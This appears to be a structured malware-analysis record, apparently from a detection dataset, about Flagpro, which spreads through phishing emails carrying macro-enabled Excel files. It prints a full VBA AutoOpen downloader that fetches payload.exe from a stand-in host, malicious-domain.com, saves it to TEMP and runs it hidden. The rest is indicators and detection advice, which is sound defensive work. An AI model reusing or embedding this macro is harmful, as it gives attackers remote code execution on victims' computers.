package_info.package_manager: N/A (malicious Excel macro, delivered via phishing email)
package_info.why_malicious: Flagpro is a malware delivered via phishing emails as a compressed file containing Excel documents with malicious macros. The macros are designed to perform network reconnaissance and potentially enable further compromise of the target system, violating user trust and security policies.

execution_context.file_location: Excel document macro (VBA code embedded in .xls/.xlsm file)

malicious_snippets.code_snippet:
Sub AutoOpen()
  Dim objXML As Object
  Set objXML = CreateObject("MSXML2.XMLHTTP")
  objXML.Open "GET", "http://malicious-domain.com/payload", False
  objXML.send
  If objXML.Status = 200 Then
    Dim objFSO As Object
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Dim tempPath As String
    tempPath = Environ("TEMP") & "\payload.exe"
    Dim objStream As Object
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write objXML.responseBody
    objStream.SaveToFile tempPath, 2
    objStream.Close
    Shell tempPath, vbHide
  End If
End Sub
malicious_snippets.code_behavior: At document open (macro execution), the code downloads an executable payload from a remote server, writes it to the local TEMP directory, and executes it, enabling remote code execution and potential further compromise.

malice_analysis.why_suspicious: The macro automatically downloads and executes a binary from an external server without user consent, a classic malware delivery technique.
malice_analysis.violated_expectations: Normal Excel macros should not download and execute external binaries; legitimate macros typically automate spreadsheet tasks, not system-level actions.
malice_analysis.similar_legitimate_use: Automated document processing in trusted enterprise environments (rare, and with strict controls).
key_indicators: Use of CreateObject to instantiate MSXML2.XMLHTTP and Scripting.FileSystemObject
Writing and executing a file in the TEMP directory
AutoOpen macro triggers on document open

attack_chain.action: Victim receives phishing email with a compressed file containing a malicious Excel document.
User opens the Excel document and enables macros, triggering the malicious macro code.
Macro downloads and executes a remote payload, establishing attacker foothold and enabling network reconnaissance.
attack_chain.leads_to: Further post-exploitation activities (network reconnaissance, data exfiltration, etc.)

behavioral_signatures: Excel macros that instantiate MSXML2.XMLHTTP or Scripting.FileSystemObject
Macros that download and execute files from external URLs
AutoOpen or Workbook_Open event handlers in Excel macros
file_indicators: Compressed email attachments containing Excel documents
Temporary files written to %TEMP% directory with .exe extension
network_indicators: Outbound HTTP/HTTPS requests from Excel processes to unknown or suspicious domains
Connections to attacker-controlled infrastructure immediately after document open
detection_knowledge.how_to_detect: Monitor for Excel documents with macros that use CreateObject to instantiate network or filesystem objects, especially those that download and execute binaries. Flag emails with compressed attachments containing macro-enabled Excel files. Alert on outbound network connections from Office applications to untrusted domains, and on the creation and execution of new files in the TEMP directory by Excel processes.
